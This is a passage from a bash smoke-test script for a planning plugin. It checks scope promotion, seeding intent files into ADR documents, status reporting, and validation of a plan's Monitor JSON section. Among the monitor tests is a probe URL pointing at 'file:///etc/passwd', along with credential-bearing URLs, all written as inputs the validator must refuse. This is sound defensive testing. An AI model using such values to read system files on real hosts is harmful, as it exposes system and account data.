  && [ "$(printf 'a decade ago, acceded 1234567 times at 2024\n' | sp_norm "$SP_TMP/old-a")" = 'a decade ago, acceded 1234567 times at 2024' ] || fail "scope-promote: sp_norm does not hide exactly the short commit ids"
[ "$SP_O_RC" = 0 ] && [ "$SP_N_RC" = 0 ] || fail "scope-promote: a 6-phase scope-less plan did not promote (old rc=$SP_O_RC, new rc=$SP_N_RC): $SP_N_OUT"
[ "$SP_O_OUT" = "$SP_N_OUT" ] || fail "scope-promote: a scope-less plan's promote output changed since 210da67: $(diff <(printf '%s\n' "$SP_O_OUT") <(printf '%s\n' "$SP_N_OUT") | head -20)"
grep -qF "Validation passed." <<<"$SP_N_OUT" && ! grep -qF "Scope:" <<<"$SP_N_OUT" || fail "scope-promote: a scope-less promote printed scope output: $SP_N_OUT"
# ... and the refusal of a scope-less plan (Proposed ADR) is word for word what 210da67 printed
SP_DATE="2001-01-01T00:00:00Z" sp_fx old-b none; SP_DATE="2002-02-02T00:00:00Z" sp_fx new-b none
sp_edc old-b "$SP_ADR" 's/^\*\*Status\*\*: Accepted/**Status**: Proposed/'; sp_edc new-b "$SP_ADR" 's/^\*\*Status\*\*: Accepted/**Status**: Proposed/'
sp_run "$SP_OLD" "$SP_TMP/old-b"; SP_O_RC="$SP_RC"; SP_O_OUT="$(printf '%s\n' "$SP_OUT" | sp_norm "$SP_TMP/old-b")"; sp_run "$SP_PROMOTE" "$SP_TMP/new-b"; SP_N_OUT="$(printf '%s\n' "$SP_OUT" | sp_norm "$SP_TMP/new-b")"
[ "$SP_O_RC" = 1 ] && [ "$SP_RC" = 1 ] && [ "$SP_O_OUT" = "$SP_N_OUT" ] && grep -qF "ADR status is not 'Accepted'" <<<"$SP_OUT" || fail "scope-promote: the scope-less refusal differs from 210da67 (old rc=$SP_O_RC new rc=$SP_RC): $SP_OUT"
# (f) adversarial neighbours: each refused with a clear message, nothing initialised
sp_fx n-plan-only bugfix; sp_edc n-plan-only "$SP_ADR" '/^\*\*Scope\*\*:/d'
sp_refused "Scope in the plan only" "$SP_TMP/n-plan-only" "Scope is declared in the plan but not in the ADR"
sp_fx n-adr-only bugfix; sp_edc n-adr-only "$SP_PLAN" '/^> \*\*Scope\*\*:/d'
sp_refused "Scope in the ADR only" "$SP_TMP/n-adr-only" "Scope is declared in the ADR but not in the plan"
sp_fx n-disagree bugfix; sp_edc n-disagree "$SP_PLAN" 's/^> \*\*Scope\*\*: bugfix/> **Scope**: poc/'
sp_refused "ADR bugfix with plan poc" "$SP_TMP/n-disagree" "Scope disagrees: ADR says 'bugfix', plan says 'poc'"
for SP_BAD in "huge:unknown Scope 'huge'" ":unknown Scope ''" "{{SCOPE}}:unknown Scope '.*SCOPE.*'" "Bugfix:unknown Scope 'Bugfix'" "bugfix extra:unknown Scope 'bugfix extra'"; do
  SP_VAL="${SP_BAD%%:*}"; SP_MSG="${SP_BAD#*:}"; SP_N="n-bad-$(printf '%s' "$SP_VAL" | tr -c 'a-z' '_')"
  sp_fx "$SP_N" bugfix
  sp_ed "$SP_TMP/$SP_N/$SP_ADR" "s/^\*\*Scope\*\*: bugfix/**Scope**: $SP_VAL/"
  sp_edc "$SP_N" "$SP_PLAN" "s/^> \*\*Scope\*\*: bugfix/> **Scope**: $SP_VAL/"
  sp_refused "an unknown Scope value '$SP_VAL'" "$SP_TMP/$SP_N" "$SP_MSG"
done
for SP_BAD in "**scope**: bugfix" "**Scope** bugfix" "**Scope**:bugfix-ish"; do
  sp_fx n-mal bugfix; sp_edc n-mal "$SP_ADR" "s/^\*\*Scope\*\*: bugfix/$SP_BAD/"
  sp_refused "a malformed Scope line '$SP_BAD'" "$SP_TMP/n-mal" "malformed Scope line in ADR|unknown Scope|Scope disagrees"
done
sp_fx n-twice bugfix; sp_edc n-twice "$SP_ADR" 's/^\*\*Scope\*\*: bugfix/&\
**Scope**: feature/'
sp_refused "a Scope declared twice" "$SP_TMP/n-twice" "ADR declares Scope more than once"
# a bugfix ADR that keeps the optional sections still promotes
sp_fx opt bugfix; printf '\n## Pseudocode\n\nx\n\n## Architecture\n\nx\n\n## Data Model\n\nx\n\n## API Surface\n\nx\n' >>"$SP_TMP/opt/$SP_ADR"; git -C "$SP_TMP/opt" commit -qam opt
sp_promoted "a bugfix ADR that keeps the optional sections" "$SP_TMP/opt"
# enforcement is not loosened: every other refusal is unchanged under bugfix
sp_fx e-gate bugfix; sp_edc e-gate "$SP_PLAN" 's/^  - Acceptance: user types `approve ship`/  - Acceptance: looks fine/'
sp_refused "a bugfix plan with a gate Acceptance that has no approval phrase" "$SP_TMP/e-gate" "Gate task has ambiguous Acceptance|should require approval phrase"
sp_fx e-status bugfix; sp_edc e-status "$SP_ADR" 's/^\*\*Status\*\*: Accepted/**Status**: Proposed/'
sp_refused "a bugfix with a Proposed ADR" "$SP_TMP/e-status" "ADR status is not 'Accepted'"
sp_fx e-todo bugfix; printf '\n[ TODO left over ]\n' >>"$SP_TMP/e-todo/$SP_ADR"; git -C "$SP_TMP/e-todo" commit -qam t
sp_refused "a bugfix ADR with a leftover TODO" "$SP_TMP/e-todo" "unresolved \[ TODO \]"
sp_fx e-acc bugfix; sp_edc e-acc "$SP_PLAN" '/Implement the change/{n;d;}'
sp_refused "a bugfix plan with a task that has no Acceptance" "$SP_TMP/e-acc" "plan is invalid"
# nothing escaped the fixtures: no worktree, branch or state outside $SMOKE_TMP, and the checkout is unchanged
[ "$(git -C "$EB_ROOT" status --porcelain)" = "$EB_STATUS" ] || fail "scope-promote: the checkout's git status changed"
ok "scope-promote: 2-phase bugfix and 3-phase poc promote; 3-phase bugfix and 4-phase poc are refused naming the limit; [tier:c] under bugfix/poc promotes with a warning; a scope-less plan's output is byte-identical to 210da67 (promote and refusal); Scope in one file only, disagreeing, unknown, empty, placeholder, wrong-case, malformed and doubled values are refused; a bugfix ADR with the optional sections promotes; gate, status, TODO and Acceptance checks are unchanged under bugfix"

# 67. intent-seed (Phase 2.1): start.sh seeds an intent file's Problem into the ADR's "Why this matters"
#     (full and lean ADR, both profiles); never overwrites the intent file; scaffolds one for poc/feature only.
IS_TMP="$SMOKE_TMP/intent-seed"; mkdir -p "$IS_TMP" || fail "intent-seed: cannot create the temp dir"
IS_PROBLEM_FILE="$IS_TMP/problem.txt"
printf '%s\n' 'Checkout costs $HOME users a `retry` and {{SLUG}} loses orders.' '' 'Second paragraph: still the problem.' >"$IS_PROBLEM_FILE"
is_repo() { local d="$IS_TMP/$1"; rm -rf "${d:?}"; mkdir -p "$d/.claude/tasks" && git -C "$d" init -q -b main || fail "intent-seed: cannot init $1"; }
is_why() { sed -n '/^### Why this matters$/,/^### Requirements$/p' "$1"; }  # the section, ending at the next heading
is_intent() { { printf '# Intent\n\n## Problem\n\n'; cat "$IS_PROBLEM_FILE"; printf '\n## Who it'"'"'s for\n\nops\n\n## Non-goals\n\nnone\n'; } >"$1"; }
for IS_PROF in generic apex; do
  IS_RUN() { (cd "$IS_D" && APEX_PLAN_PROFILE="$IS_PROF" bash "$SS" "$@" 2>&1); }
  # (a) an intent file present: Problem seeded in the lean and the full ADR; other sections unchanged
  for IS_SC in bugfix poc feature; do
    is_repo "a-$IS_PROF-$IS_SC"; IS_D="$IS_TMP/a-$IS_PROF-$IS_SC"
    is_intent "$IS_D/.claude/tasks/x-intent.md"; cp "$IS_D/.claude/tasks/x-intent.md" "$IS_D/before.md"
    IS_OUT="$(IS_RUN x T --scope "$IS_SC")" || fail "intent-seed: $IS_PROF $IS_SC with an intent file failed: $IS_OUT"
    IS_W="$(is_why "$IS_D/.claude/tasks/x-adr.md")"
    grep -qF -- 'Checkout costs $HOME users a `retry` and {{SLUG}} loses orders.' <<<"$IS_W" || fail "intent-seed: $IS_PROF $IS_SC ADR 'Why this matters' lacks the Problem text: $IS_W"
    grep -qF -- 'Second paragraph: still the problem.' <<<"$IS_W" || fail "intent-seed: $IS_PROF $IS_SC lost the second paragraph: $IS_W"
    ! grep -qF -- '[ TODO ]' <<<"$IS_W" || fail "intent-seed: $IS_PROF $IS_SC kept the placeholder after seeding: $IS_W"
    ! grep -qF -- 'Concrete pain points' <<<"$IS_W" && ! grep -qF -- 'One paragraph.' <<<"$IS_W" || fail "intent-seed: $IS_PROF $IS_SC kept the placeholder guidance: $IS_W"
    [ "$(grep -c '^### Why this matters$' "$IS_D/.claude/tasks/x-adr.md")" = 1 ] || fail "intent-seed: $IS_PROF $IS_SC ADR does not have exactly one 'Why this matters' heading"
    grep -qF '### Requirements' "$IS_D/.claude/tasks/x-adr.md" && grep -qF '### Constraints' "$IS_D/.claude/tasks/x-adr.md" || fail "intent-seed: $IS_PROF $IS_SC seeding damaged the next sections"
    cmp -s "$IS_D/before.md" "$IS_D/.claude/tasks/x-intent.md" || fail "intent-seed: $IS_PROF $IS_SC changed the intent file"
    python3 "$EX/planlib.py" validate "$IS_D/.claude/plans/x-plan.md" >/dev/null 2>&1 || fail "intent-seed: $IS_PROF $IS_SC plan no longer validates"
    # the seeded ADR equals an unseeded one everywhere outside that section
    is_repo "n-$IS_PROF-$IS_SC"; IS_N="$IS_TMP/n-$IS_PROF-$IS_SC"
    (cd "$IS_N" && APEX_PLAN_PROFILE="$IS_PROF" bash "$SS" x T --scope "$IS_SC" >/dev/null 2>&1) || fail "intent-seed: $IS_PROF $IS_SC control run failed"
    diff <(sed '/^### Why this matters$/,/^### Requirements$/d' "$IS_D/.claude/tasks/x-adr.md") <(sed '/^### Why this matters$/,/^### Requirements$/d' "$IS_N/.claude/tasks/x-adr.md") >/dev/null || fail "intent-seed: $IS_PROF $IS_SC seeding changed a section other than 'Why this matters'"
  done
  # (b) none + bugfix: succeeds, no intent file, nothing printed about intent
  is_repo "b-$IS_PROF"; IS_D="$IS_TMP/b-$IS_PROF"
  IS_OUT="$(IS_RUN x T --scope bugfix)" || fail "intent-seed: $IS_PROF bugfix without an intent file failed: $IS_OUT"
  [ ! -e "$IS_D/.claude/tasks/x-intent.md" ] || fail "intent-seed: $IS_PROF bugfix created an intent file"
  ! grep -qE '^Intent|WARNING' <<<"$IS_OUT" || fail "intent-seed: $IS_PROF bugfix printed about intent: $IS_OUT"
  grep -qF -- '[ TODO ]' <(is_why "$IS_D/.claude/tasks/x-adr.md") || fail "intent-seed: $IS_PROF bugfix lost the placeholder"
  # (c) none + poc|feature: reminder, exit 0, intent file from the template with all four headings
  for IS_SC in poc feature; do
    is_repo "c-$IS_PROF-$IS_SC"; IS_D="$IS_TMP/c-$IS_PROF-$IS_SC"
    IS_OUT="$(IS_RUN x T --scope "$IS_SC")" || fail "intent-seed: $IS_PROF $IS_SC without an intent file did not exit 0: $IS_OUT"
    grep -qF -- 'Intent: scaffolded' <<<"$IS_OUT" && grep -qF -- 'Fill in its Problem section' <<<"$IS_OUT" || fail "intent-seed: $IS_PROF $IS_SC printed no intent reminder: $IS_OUT"
    [ -s "$IS_D/.claude/tasks/x-intent.md" ] || fail "intent-seed: $IS_PROF $IS_SC created no intent file"
    for IS_H in '## Problem' '## Who it'"'"'s for' '## Why now' '## Non-goals'; do
      grep -qxF -- "$IS_H" "$IS_D/.claude/tasks/x-intent.md" || fail "intent-seed: $IS_PROF $IS_SC intent file lacks '$IS_H'"
      grep -qxF -- "$IS_H" "$SS_TPL/$IS_PROF/intent-template.md" || fail "intent-seed: $IS_PROF intent-template.md lacks '$IS_H'"
    done
    grep -qF -- '[ TODO ]' <(is_why "$IS_D/.claude/tasks/x-adr.md") || fail "intent-seed: $IS_PROF $IS_SC seeded an unfilled template into the ADR"
    # re-running with --force while the scaffold is still unfilled warns and keeps the placeholder
    IS_OUT="$(IS_RUN x T --scope "$IS_SC" --force)" || fail "intent-seed: $IS_PROF $IS_SC --force over an unfilled scaffold failed: $IS_OUT"
    grep -qF -- 'WARNING' <<<"$IS_OUT" && grep -qF -- 'still [ TODO ]' <<<"$IS_OUT" || fail "intent-seed: $IS_PROF $IS_SC unfilled scaffold gave no warning: $IS_OUT"
  done
  # (d) a user-written intent file survives --force, and re-running after filling in the scaffold seeds it
  is_repo "d-$IS_PROF"; IS_D="$IS_TMP/d-$IS_PROF"
  (cd "$IS_D" && APEX_PLAN_PROFILE="$IS_PROF" bash "$SS" x T --scope feature >/dev/null 2>&1) || fail "intent-seed: $IS_PROF scaffold run failed"
  is_intent "$IS_D/.claude/tasks/x-intent.md"; cp "$IS_D/.claude/tasks/x-intent.md" "$IS_D/before.md"
  IS_OUT="$(IS_RUN x T --scope feature --force)" || fail "intent-seed: $IS_PROF --force over a user-written intent file failed: $IS_OUT"
  cmp -s "$IS_D/before.md" "$IS_D/.claude/tasks/x-intent.md" || fail "intent-seed: $IS_PROF --force clobbered the user-written intent file"
  grep -qF -- 'Second paragraph: still the problem.' <(is_why "$IS_D/.claude/tasks/x-adr.md") || fail "intent-seed: $IS_PROF --force did not seed the user-written Problem"
  # (e) malformed intent files warn, keep the placeholder, still succeed
  for IS_BAD in nosection empty todo; do
    is_repo "e-$IS_PROF-$IS_BAD"; IS_D="$IS_TMP/e-$IS_PROF-$IS_BAD"
    case "$IS_BAD" in
      nosection) printf '# Intent\n\n## Who it'"'"'s for\n\nops\n' >"$IS_D/.claude/tasks/x-intent.md" ;;
      empty)     printf '# Intent\n\n## Problem\n\n   \n## Why now\n\nnow\n' >"$IS_D/.claude/tasks/x-intent.md" ;;
      todo)      printf '# Intent\n\n## Problem\n\n[ TODO ]\n\n## Why now\n\nnow\n' >"$IS_D/.claude/tasks/x-intent.md" ;;
    esac
    cp "$IS_D/.claude/tasks/x-intent.md" "$IS_D/before.md"
    IS_OUT="$(IS_RUN x T --scope poc)" || fail "intent-seed: $IS_PROF $IS_BAD intent file made start.sh fail: $IS_OUT"
    grep -qF -- 'WARNING: ' <<<"$IS_OUT" || fail "intent-seed: $IS_PROF $IS_BAD intent file gave no warning: $IS_OUT"
    grep -qF -- '[ TODO ]' <(is_why "$IS_D/.claude/tasks/x-adr.md") || fail "intent-seed: $IS_PROF $IS_BAD intent file lost the placeholder"
    cmp -s "$IS_D/before.md" "$IS_D/.claude/tasks/x-intent.md" || fail "intent-seed: $IS_PROF $IS_BAD intent file was modified"
  done
  # a Problem section followed by a heading inside a fenced block keeps the fence content
  is_repo "f-$IS_PROF"; IS_D="$IS_TMP/f-$IS_PROF"
  printf '# Intent\n\n## Problem\n\nSee:\n\n```\n## not a heading\n```\n\nafter fence\n\n## Why now\n\nnow\n' >"$IS_D/.claude/tasks/x-intent.md"
  IS_RUN x T --scope poc >/dev/null || fail "intent-seed: $IS_PROF fenced intent file made start.sh fail"
  grep -qF -- 'after fence' <(is_why "$IS_D/.claude/tasks/x-adr.md") || fail "intent-seed: $IS_PROF a fenced '## ' line cut the Problem short"
  ! grep -qF -- 'now' <(is_why "$IS_D/.claude/tasks/x-adr.md") || fail "intent-seed: $IS_PROF the Why now body leaked into 'Why this matters'"
done
ok "intent-seed: an intent file's Problem (with \$, backtick, {{ and two paragraphs) replaces 'Why this matters' in the lean and full ADR of both profiles and nothing else changes; bugfix with no intent file writes none and says nothing; poc/feature scaffold one from the template with a reminder and exit 0; a user-written intent file survives --force; a missing, empty or [ TODO ] Problem warns and keeps the placeholder"

# 68. status-scope (Phase 2.2): status.sh prints Scope (header-region rule of promote-to-loop.sh 7b) and the intent
#     file's state; a report only, so a disagreeing, partial or malformed Scope is reported and exit stays 0.
ST="$PLUGIN_ROOT/skills/apex-plan/scripts/status.sh"; ST_TMP="$SMOKE_TMP/status-scope"
rm -rf "${ST_TMP:?}"; mkdir -p "$ST_TMP" || fail "status-scope: cannot create the temp dir"
git -C "$ST_TMP" init -q -b main || fail "status-scope: cannot init the temp repo"
st_run() { ST_OUT="$(cd "$ST_TMP" && bash "$ST" "$1" 2>&1)" || fail "status-scope: status.sh $1 exited non-zero: $ST_OUT"; }
st_line() { grep -E "^  $1:" <<<"$ST_OUT" | head -1 | sed -E 's/^  [A-Za-z]+: +//'; }
st_new() { (cd "$ST_TMP" && bash "$SS" "$1" T --scope "$2" >/dev/null 2>&1) || fail "status-scope: start.sh $1 --scope $2 failed"; }
ST_ADR() { echo "$ST_TMP/.claude/tasks/$1-adr.md"; }; ST_PLAN() { echo "$ST_TMP/.claude/plans/$1-plan.md"; }
st_new sb bugfix; st_run sb
[ "$(st_line Scope)" = "bugfix" ] || fail "status-scope: bugfix scaffold did not show Scope bugfix: $ST_OUT"
[ "$(st_line Intent)" = "none" ] || fail "status-scope: bugfix scaffold did not show Intent none: $ST_OUT"
st_new sf feature; st_run sf
[ "$(st_line Scope)" = "feature" ] || fail "status-scope: feature scaffold did not show Scope feature: $ST_OUT"
grep -qF -- "sf-intent.md (Problem not filled)" <<<"$ST_OUT" || fail "status-scope: scaffolded intent not shown as unfilled: $ST_OUT"
printf '# Intent\n\n## Problem\n\nOrders are lost at checkout.\n\n## Non-goals\n\nnone\n' >"$ST_TMP/.claude/tasks/sf-intent.md"; st_run sf
grep -qF -- "sf-intent.md (Problem filled)" <<<"$ST_OUT" || fail "status-scope: a filled Problem not shown as filled: $ST_OUT"
printf '# Intent\n\n## Problem\n\n## Non-goals\n\nnone\n' >"$ST_TMP/.claude/tasks/sf-intent.md"; st_run sf
grep -qF -- "(Problem not filled)" <<<"$ST_OUT" || fail "status-scope: an empty Problem not shown as unfilled: $ST_OUT"
# scope-less pair
st_new sn feature; sed -i.bak '/^\*\*Scope\*\*:/d' "$(ST_ADR sn)"; sed -i.bak '/^> \*\*Scope\*\*:/d' "$(ST_PLAN sn)"
! grep -q 'Scope\*\*' "$(ST_ADR sn)" "$(ST_PLAN sn)" || fail "status-scope: fixture still has Scope lines"
st_run sn; [ "$(st_line Scope)" = "feature (no Scope line)" ] || fail "status-scope: scope-less pair not shown as 'feature (no Scope line)': $ST_OUT"
# a Scope line below the header (after a ## heading) does not count
st_new sh feature; sed -i.bak '/^\*\*Scope\*\*:/d' "$(ST_ADR sh)"; sed -i.bak '/^> \*\*Scope\*\*:/d' "$(ST_PLAN sh)"
printf '\n## Notes\n\n**Scope**: bugfix\n' >>"$(ST_ADR sh)"; st_run sh
[ "$(st_line Scope)" = "feature (no Scope line)" ] || fail "status-scope: a body Scope line was read as the header Scope: $ST_OUT"
# mismatch, and one-sided: reported, exit 0
st_new sm bugfix; sed -i.bak 's/^> \*\*Scope\*\*: bugfix/> **Scope**: feature/' "$(ST_PLAN sm)"; st_run sm
grep -qF 'mismatch' <<<"$(st_line Scope)" && grep -qF 'bugfix' <<<"$(st_line Scope)" && grep -qF 'feature' <<<"$(st_line Scope)" || fail "status-scope: disagreeing pair not reported as mismatch with both values: $ST_OUT"
st_new so poc; sed -i.bak '/^> \*\*Scope\*\*:/d' "$(ST_PLAN so)"; st_run so
grep -qF 'mismatch' <<<"$(st_line Scope)" && grep -qF 'poc' <<<"$(st_line Scope)" || fail "status-scope: a one-sided Scope not reported as mismatch: $ST_OUT"
# malformed Scope lines are reported as malformed, never shown as feature (threat: silent skip)
ST_N=0
for ST_BAD in '**scope**: bugfix' '**Scope** bugfix' '**Scope**:' '**Scope**: {{SCOPE}}x' ; do
  ST_N=$((ST_N + 1)); st_new sx$ST_N bugfix; sed -i.bak "s/^\*\*Scope\*\*: bugfix/$ST_BAD/" "$(ST_ADR sx$ST_N)"
  grep -qF -- "$ST_BAD" "$(ST_ADR sx$ST_N)" || fail "status-scope: fixture lacks the malformed line '$ST_BAD'"
  st_run sx$ST_N
  case "$ST_BAD" in '**Scope**: {{SCOPE}}x') grep -qF 'ADR: {{SCOPE}}x' <<<"$ST_OUT" || fail "status-scope: '$ST_BAD' not reported verbatim: $ST_OUT";;
    *) grep -qF 'malformed' <<<"$(st_line Scope)" || fail "status-scope: malformed '$ST_BAD' not reported as malformed: $ST_OUT";; esac
  ! grep -qE '^feature' <<<"$(st_line Scope)" || fail "status-scope: malformed '$ST_BAD' shown as feature: $ST_OUT"
done
st_new sd bugfix; awk '{print} /^\*\*Scope\*\*: bugfix/{print "**Scope**: poc"}' "$(ST_ADR sd)" >"$(ST_ADR sd).new" && mv "$(ST_ADR sd).new" "$(ST_ADR sd)"; st_run sd
grep -qF 'malformed' <<<"$(st_line Scope)" || fail "status-scope: a doubled Scope line not reported: $ST_OUT"
# missing ADR and plan: still exit 0
(cd "$ST_TMP" && bash "$ST" nothing >/dev/null 2>&1) || fail "status-scope: status.sh on a missing slug exited non-zero"
ok "status-scope: status.sh prints Scope (bugfix, feature, 'feature (no Scope line)', mismatch for disagreeing or one-sided, malformed/doubled reported, body lines ignored) and Intent (none, not filled, filled), always exit 0"

# 69. monitor-section (Phase 3.2): the plan `## Monitor` section and monitorlib.py (ADR R5b, R5d).
#     A valid section passes; each malformed one is refused with the problem named (allow-list schema, fail closed:
#     a heading whose block is missing, doubled or not JSON is refused, never "not watched"); validate-file accepts a
#     repo-level file and refuses window_days there; no section and `checks: []` both promote; a bad section stops
#     promote; every plan in this checkout and every scaffold passes planlib and monitorlib; the fence handling is planlib's.
ML="$EX/monitorlib.py"; MN_TMP="$SMOKE_TMP/monitor-section"; rm -rf "${MN_TMP:?}"; mkdir -p "$MN_TMP" || fail "monitor-section: cannot create the temp dir"
# mn_plan NAME JSON: a plan with a ## Monitor section holding JSON in one json fence
mn_plan() { printf '# P\n\n- [ ] **Phase 1.1** [docs] t\n  - Acceptance: true\n\n## Monitor\n\n```json\n%s\n```\n' "$2" >"$MN_TMP/$1.md"; }
MN_HTTP='{"kind": "http", "url": "https://x.example/health", "measure": "latency_ms", "expect_status": 200}'
mn_chk() { printf '{"id": "%s", "metric": "%s", "op": "%s", "threshold": 800, "severity": "high", "probe": %s}' "$1" "$2" "$3" "$4"; }
MN_OK="$(mn_chk p95 latency.p95 '>' "$MN_HTTP"), $(mn_chk exit0 job:exit '==' '{"kind": "cmd", "command": "true", "value": "exit"}'), $(mn_chk rn m-1 '>=' '{"kind": "runner", "metrics": ["m-1"]}')"
# mn_ok NAME: valid. mn_bad NAME PATTERN: exit 1, the output names the problem.
mn_ok() { local o rc=0; o="$(python3 "$ML" validate "$MN_TMP/$1.md" 2>&1)" || rc=$?; [ "$rc" = 0 ] && [ -z "$o" ] || fail "monitor-section: $1 should be valid (exit $rc): $o"; }
mn_bad() { local o rc=0; o="$(python3 "$ML" validate "$MN_TMP/$1.md" 2>&1)" || rc=$?; [ "$rc" = 1 ] || fail "monitor-section: $1 exited $rc, expected 1: $o"; grep -qE -- "$2" <<<"$o" || fail "monitor-section: $1 did not say '$2': $o"; }
mn_plan ok "{\"window_days\": 90, \"checks\": [$MN_OK]}"; mn_ok ok
mn_plan ok1 "{\"window_days\": 1, \"checks\": []}"; mn_ok ok1
mn_plan okdef "{\"checks\": [$(mn_chk a a '<=' "$MN_HTTP")]}"; mn_ok okdef
for MN_OP in '<' '<=' '>' '>=' '=='; do mn_plan op "{\"checks\": [$(mn_chk a a "$MN_OP" "$MN_HTTP")]}"; mn_ok op; done
# op is the expected (healthy) condition and the allow-list is the ADR's set exactly: != is refused, with the problem named
mn_plan opne "{\"checks\": [$(mn_chk c1 m '!=' "$MN_HTTP")]}"; mn_bad opne "c1.*unknown op \"!=\" \(allowed: < <= > >= ==\)"
mn_plan s1 '{"window_days": 14, "checks": [{"metric": "m", "op": ">", "threshold": 1, "severity": "low", "probe": {"kind": "cmd", "command": "true"}}]}'; mn_bad s1 "checks\[0\].*missing 'id'"
mn_plan s2 "{\"checks\": [$(mn_chk c1 m '=>' "$MN_HTTP")]}"; mn_bad s2 "c1.*unknown op"
# a runner probe with a metrics list must list the check's own metric
mn_plan rm1 "{\"checks\": [$(mn_chk c1 m '>' '{"kind": "runner", "metrics": ["other"]}')]}"; mn_bad rm1 "c1.*check's metric 'm' is not in the probe's metrics"
mn_plan rm2 "{\"checks\": [$(mn_chk c1 m '>' '{"kind": "runner", "metrics": ["other", "m"]}'), $(mn_chk c2 m '>' '{"kind": "runner"}')]}"; mn_ok rm2
mn_plan s3 "{\"checks\": [$(mn_chk c1 m '>' '{"kind": "ping", "host": "x"}')]}"; mn_bad s3 "c1.*unknown probe.kind 'ping'"
# F-019: latency_ms without expect_status is refused by name (a fast 503 would count as a healthy latency)
mn_plan lat1 "{\"checks\": [$(mn_chk c1 m '<' '{"kind": "http", "url": "https://x.example/", "measure": "latency_ms"}')]}"; mn_bad lat1 "c1.*measure latency_ms needs expect_status"
# F-017: a cmd probe's value rule is stdout (the default) or exit, nothing else
mn_plan cv1 "{\"checks\": [$(mn_chk c1 m '<' '{"kind": "cmd", "command": "echo 1", "value": "stdout"}'), $(mn_chk c2 m '==' '{"kind": "cmd", "command": "true", "value": "exit"}')]}"; mn_ok cv1
mn_plan cv2 "{\"checks\": [$(mn_chk c1 m '<' '{"kind": "cmd", "command": "true", "value": "rc"}')]}"; mn_bad cv2 "c1.*value must be one of stdout, exit"
mn_plan s4 '{"window_days": 0, "checks": []}'; mn_bad s4 "window_days must be an integer 1-90"
mn_plan s5 '{"window_days": 91, "checks": []}'; mn_bad s5 "window_days must be an integer 1-90"
mn_plan s5b '{"window_days": 14.5, "checks": []}'; mn_bad s5b "window_days must be an integer"
mn_plan s5c '{"window_days": true, "checks": []}'; mn_bad s5c "window_days must be an integer"
mn_plan s6 "{\"checks\": [$(mn_chk c1 m '>' '{"kind": "http", "url": "https://x.example/", "measure": "status", "headers": {}}')]}"; mn_bad s6 "c1.*unknown key 'headers'"
mn_plan s6b "{\"checks\": [$(mn_chk c1 m '>' '{"kind": "http", "url": "https://x.example/", "measure": "status", "headers": {"Authorization": "x"}}')]}"; mn_bad s6b "unknown key 'headers'"
mn_plan s7 "{\"checks\": [$(mn_chk c1 m '>' '{"kind": "http", "url": "https://x.example/", "measure": "status", "method": "POST"}')]}"; mn_bad s7 "c1.*GET only"
mn_plan s7b "{\"checks\": [$(mn_chk c1 m '>' '{"kind": "http", "url": "https://x.example/", "measure": "status", "method": "get"}')]}"; mn_bad s7b "GET only"
mn_plan s7c "{\"checks\": [$(mn_chk c1 m '>' '{"kind": "http", "url": "https://x.example/", "measure": "status", "timeout": 600}')]}"; mn_bad s7c "unknown key 'timeout'.*fixed at 10"
mn_plan s8 "{\"checks\": [$(mn_chk dup m1 '>' "$MN_HTTP"), $(mn_chk dup m2 '>' "$MN_HTTP")]}"; mn_bad s8 "duplicate check id 'dup'"
mn_plan s11 "{\"checks\": [$(mn_chk 'bad id' m '>' "$MN_HTTP")]}"; mn_bad s11 "id must match"
mn_plan s11b "{\"checks\": [$(mn_chk _lead m '>' "$MN_HTTP")]}"; mn_bad s11b "id must match"
mn_plan s11c "{\"checks\": [$(mn_chk a 'm/x' '>' "$MN_HTTP")]}"; mn_bad s11c "metric must match"
mn_plan s11d "{\"checks\": [$(mn_chk "$(printf 'a%.0s' $(seq 129))" m '>' "$MN_HTTP")]}"; mn_bad s11d "id must match"
mn_plan s12 "{\"checks\": [], \"extra\": 1}"; mn_bad s12 "unknown key 'extra'"
mn_plan s12b '{"checks": [{"id": "a", "metric": "m", "op": ">", "threshold": 1, "severity": "low", "probe": {"kind": "cmd", "command": "true", "shell": "sh"}, "note": "x"}]}'; mn_bad s12b "unknown key 'note'"; mn_bad s12b "unknown key 'shell'"
mn_plan s13 "{\"checks\": [$(mn_chk a m '>' '{"kind": "http", "url": "file:///etc/passwd", "measure": "status"}')]}"; mn_bad s13 "http:// or https://"
mn_plan s13b "{\"checks\": [$(mn_chk a m '>' '{"kind": "http", "url": "https://u:p@x.example/", "measure": "status"}')]}"; mn_bad s13b "credentials"
mn_plan s14 '{"checks": [{"id": "a", "metric": "m", "op": ">", "threshold": NaN, "severity": "low", "probe": {"kind": "cmd", "command": "true"}}]}'; mn_bad s14 "invalid JSON"
mn_plan s14b '{"checks": [{"id": "a", "metric": "m", "op": ">", "threshold": "5", "severity": "low", "probe": {"kind": "cmd", "command": "true"}}]}'; mn_bad s14b "threshold must be a finite number"
mn_plan s14c '{"checks": [{"id": "a", "metric": "m", "op": ">", "threshold": 1e999, "severity": "low", "probe": {"kind": "cmd", "command": "true"}}]}'; mn_bad s14c "threshold must be a finite number"
mn_plan s15 "{\"checks\": [$(mn_chk a m '>' "$MN_HTTP" | sed 's/high/urgent/')]}"; mn_bad s15 "severity must be one of"
mn_plan s16 '{"checks": [], "checks": []}'; mn_bad s16 "duplicate key 'checks'"
mn_plan s17 '{"checks": "none"}'; mn_bad s17 "checks must be a list"
mn_plan s18 '{"window_days": 14}'; mn_bad s18 "missing 'checks'"
mn_plan s19 '[]'; mn_bad s19 "must be an object"
# two json blocks, invalid JSON, a heading with no block, a non-json fence, an unclosed fence, a doubled or malformed heading
mn_plan twob '{"checks": []}'; printf '\n```json\n{"checks": []}\n```\n' >>"$MN_TMP/twob.md"; mn_bad twob "2 fenced blocks"
mn_plan badj '{"checks": [}'; mn_bad badj "invalid JSON"
mn_plan emptyj ''; mn_bad emptyj "invalid JSON"
printf '# P\n\n- [ ] **Phase 1.1** [docs] t\n  - Acceptance: true\n\n## Monitor\n\nWe will watch it.\n' >"$MN_TMP/nob.md"; mn_bad nob "no fenced json block"
printf '# P\n\n- [ ] **Phase 1.1** [docs] t\n  - Acceptance: true\n\n## Monitor\n\n```json\n{"checks": []}\n' >"$MN_TMP/open.md"; mn_bad open "never closed"
printf '# P\n\n- [ ] **Phase 1.1** [docs] t\n  - Acceptance: true\n\n## Monitor\n\n```yaml\nchecks: []\n```\n' >"$MN_TMP/yaml.md"; mn_bad yaml "only a fenced json block"
printf '# P\n\n- [ ] **Phase 1.1** [docs] t\n  - Acceptance: true\n\n## Monitor\n\n```json\n{"checks": []}\n```\n\n## Monitor\n\n```json\n{"checks": []}\n```\n' >"$MN_TMP/twoh.md"; mn_bad twoh "more than one Monitor heading"
